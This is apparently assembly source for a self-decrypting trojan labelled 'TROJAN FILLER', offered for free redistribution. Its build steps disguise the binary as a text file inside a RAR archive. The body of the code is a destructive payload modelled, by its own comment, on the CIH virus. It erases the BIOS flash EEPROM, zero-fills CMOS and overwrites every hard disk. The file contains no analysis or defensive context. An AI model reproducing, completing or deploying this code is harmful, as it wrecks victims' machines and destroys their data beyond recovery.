   ;COMMENT /
   ;  (C) VBA Ltd. ALL RIGHTS RESERVED.
   ;  E-mail: support@vba.com.by
   ;
   ;  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.
   ;
   ;  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT
   ;  MODIFICATION, ARE PERMITTED.
   ;
   ;  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND
   ;  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
   ;  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
   ;  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
   ;  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
   ;  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
   ;  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
   ;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
   ;  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
   ;  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
   ;  SUCH DAMAGE.
   ;/

   ; TROJAN FILLER
   ; (READ VBA.INC TROJAN_ TOPIC FOR DETAILED DESCRIPTION)

   ; REQUIRES:
   ; TASM.EXE -M TFILLER.ASM
   ; TLINK.EXE -T TFILLER.OBJ
   ; TFCRYPT.COM
   ; REN TFILLER.COM TINY.TXT
   ; RAR.EXE A -M0 -TL DEMOCOOL.RAR TINY.TXT

   .MODEL TINY
   .386P

   CRYPT_MASK      =   0ED8CH

   BIT32           SEGMENT BYTE PUBLIC 'CODE' USE32
               ASSUME  CS:BIT32,DS:BIT32
               ORG 100H

   START:          INT 20H         ;CALL VMM/GET_SYS_TIME
               DD  1003FH          ;(EXIT WHEN DOSLOAD)

               AND DH,DL           ;DX=0(DL=0)
               LEA EDI,BEG_CRYPT[ESI]
               XOR ECX,ECX
               MOV CL,LEN_CRYPT
   NEXT_CRYPT:     XOR EDX,ECX
               SUB DX,CRYPT_MASK
               XOR [EDI],DL
               SCASB
               LOOP    NEXT_CRYPT

   ; ERASE EEPROM/CMOS/ALL HARD DISKS (WIN95.CIH ALGORITHM EXEPT CMOS KILLING)

   BEG_CRYPT       =   $-START
               CLI             ;ERASE EEPROM
               MOV BP,0CF8H
               ADD ESI,4 PTR IO4EEPROM
               MOV EDI,8000384CH
               MOV DX,0CFEH
               CALL    ESI
               MOV DI,58H
               DEC EDX
               MOV 2 PTR CALC_CODE[ESI],0F24H
               CALL    ESI
               LEA EBX,WRITE_ENABLE[ESI]
               MOV EAX,0E5555H
               MOV ECX,0E2AAAH
               CALL    EBX
               MOV 1 PTR [EAX],60H
               PUSH    ECX
               LOOP    $
               XOR AH,AH
               MOV [EAX],AL
               XCHG    ECX,EAX
               LOOP    $
               MOV EAX,0F5555H
               POP ECX
               MOV CH,0AAH
               CALL    EBX
               MOV 1 PTR [EAX],20H
               LOOP    $
               MOV AH,0E0H
               MOV [EAX],AL
               MOV 2 PTR CALC_CODE[ESI],100CH
               CALL    ESI
               XOR EAX,EAX
   SET_CMOS:       OUT 70H,AL          ;CMOS ZEROFILL
               INC AL
               OUT 71H,AL
               JNE SET_CMOS
               XCHG    EBX,EAX         ;ERASE ALL HARD DISKS
               MOV BH,80H
               PUSH    EBX
               SUB ESP,2CH
               PUSH    0C0001000H
               MOV BH,8
               PUSH    EBX ECX ECX ECX
               PUSH    40000501H
               INC ECX
               PUSH    ECX ECX
               MOV ESI,ESP
               SUB ESP,0ACH
   CALL_NEXT:      INT 20H
               DD  100004H
               CMP 2 PTR [ESI+6],17H
               JNE NEXT_DRV
               ADD 4 PTR [ESI+10H],EBX
               MOV 1 PTR [ESI+4DH],7FH
   NEXT_DRV:       INC 1 PTR [ESI+4DH]
               JMP CALL_NEXT

   IO4EEPROM       =   $-START
   DELTA_IO:       XCHG    EAX,EDI
               XCHG    EDX,EBP
               OUT DX,EAX
               XCHG    EAX,EDI
               XCHG    EDX,EBP
               IN  AL,DX
   CALC_CODE       =   $-DELTA_IO
               OR  AL,44H
               XCHG    EAX,EDI
               XCHG    EDX,EBP
               OUT DX,EAX
               XCHG    EAX,EDI
               XCHG    EDX,EBP
               OUT DX,AL
               RETN

   WRITE_ENABLE        =   $-DELTA_IO
               MOV [EAX],CL
               MOV [ECX],AL
               MOV 1 PTR [EAX],80H
               MOV [EAX],CL
               MOV [ECX],AL
               RETN
   LEN_CRYPT       =   $-START


               DB  1000H DUP (1BH)     ;FAKE BUFFER

               ENDS
               END START
